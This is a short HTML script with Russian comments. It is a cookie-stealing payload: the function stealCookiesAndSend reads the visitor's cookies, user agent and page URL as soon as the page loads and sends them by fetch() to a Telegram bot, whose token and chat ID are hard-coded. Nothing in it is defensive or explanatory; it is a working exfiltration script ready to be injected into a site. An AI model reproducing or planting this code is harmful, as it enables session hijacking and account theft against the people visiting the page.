<script>
// Ваши данные Telegram-бота
const BOT_TOKEN = "8193753656:AAFw7d9vULwYekSD8-Ie0TRRShjOHeUMxk0"; // Замените на токен бота
const CHAT_ID = "5921910154";     // Замените на ваш chat_id

// Функция для отправки данных в Telegram
function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  
  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
    }),
  })
  .then(response => response.json())
  .then(data => console.log("Успешно отправлено:", data))
  .catch(error => console.error("Ошибка:", error));
}

// Получаем все cookies и отправляем в Telegram
function stealCookiesAndSend() {
  const cookies = document.cookie; // Получаем все cookies
  const userAgent = navigator.userAgent; // Получаем User-Agent
  const currentUrl = window.location.href; // Получаем текущий URL
  
  const message = `
🚨 *Новые данные с сайта* 🚨
🔗 *URL:* ${currentUrl}
🍪 *Cookies:* \`${cookies}\`
🖥 *User-Agent:* \`${userAgent}\`
  `;
  
  sendToTelegram(message);
}

// Вызываем функцию (можно по событию, например, клику)
stealCookiesAndSend();
</script>
